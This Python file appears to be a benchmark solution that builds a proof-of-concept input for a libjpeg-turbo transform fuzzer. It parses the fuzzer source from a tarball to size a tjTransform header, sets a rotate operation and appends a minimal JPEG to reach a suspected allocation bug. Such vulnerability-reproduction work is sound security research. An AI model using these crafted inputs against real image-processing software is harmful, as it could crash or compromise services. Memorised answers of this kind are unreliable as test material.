import tarfile
import os
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        header_size = 0
        content = ""
        
        # Attempt to inspect the source code to determine the fuzzer's expected header size
        try:
            if os.path.isfile(src_path) and (src_path.endswith('.tar.gz') or src_path.endswith('.tgz') or src_path.endswith('.tar.xz')):
                with tarfile.open(src_path, 'r') as tar:
                    candidates = []
                    # Identify potential fuzzer source files
                    for m in tar.getmembers():
                        if "fuzz" in m.name and m.name.endswith(".cc") and "transform" in m.name:
                            candidates.append(m)
                    
                    # Prioritize tj3_transform_fuzzer as it matches the vulnerability context (tj3Alloc)
                    target = None
                    for c in candidates:
                        if "tj3" in c.name:
                            target = c
                            break
                    if not target and candidates:
                        target = candidates[0]
                        
                    if target:
                        f = tar.extractfile(target)
                        content = f.read().decode('utf-8', errors='ignore')
        except Exception:
            pass
        
        # Analyze source content for header size check
        if content:
            # Look for typical check: if (size < EXPRESSION)
            match = re.search(r'if\s*\(\s*size\s*<\s*([^)]+)\s*\)', content)
            if match:
                expr = match.group(1)
                
                def sizeof_repl(m):
                    t = m.group(1).strip()
                    # Type size mapping for x86_64
                    mapping = {
                        'tjTransform': 40,
                        'tjRegion': 16,
                        'int': 4, 'unsigned int': 4, 'uint32_t': 4,
                        'long': 8, 'unsigned long': 8, 'uint64_t': 8, 'size_t': 8,
                        'char': 1, 'unsigned char': 1, 'uint8_t': 1
                    }
                    if '*' in t: return '8' # Pointers are 8 bytes
                    return str(mapping.get(t, 0))
                
                # Replace sizeof() calls with numeric values
                expr_clean = re.sub(r'sizeof\s*\(([^)]+)\)', sizeof_repl, expr)
                try:
                    # Evaluate the expression
                    val = int(eval(expr_clean, {"__builtins__":{}}))
                    if val > 0:
                        header_size = val
                except:
                    pass

        # Fallback if analysis failed
        if header_size == 0:
            header_size = 40 # Standard size for tjTransform on 64-bit systems

        # Construct the PoC
        # 1. Header with parameters
        header = bytearray(header_size)
        
        # Try to set the 'op' field to TJXOP_ROT90 (value 5) to trigger a transform.
        # In tjTransform struct, 'op' is at offset 16 (after 4 ints of tjRegion).
        if header_size >= 20:
            struct.pack_into('<I', header, 16, 5)
            
        # 2. Valid JPEG Image (1x1 pixel)
        # This allows the fuzzer to proceed to the transformation stage.
        jpeg_data = (
            b'\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00'
            b'\xff\xdb\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\x09\x09\x08\x0a\x0c'
            b'\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c\x20'
            b'\x24\x2e\x27\x20\x22\x2c\x23\x1c\x1c\x28\x37\x29\x2c\x30\x31\x34\x34\x34\x1f\x27'
            b'\x39\x3d\x38\x32\x3c\x2e\x33\x34\x32\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01'
            b'\x11\x00\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00'
            b'\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\xff\xda\x00\x08\x01'
            b'\x01\x00\x00\x3f\x00\xbf\x80\x7f\xff\xd9'
        )
        
        return header + jpeg_data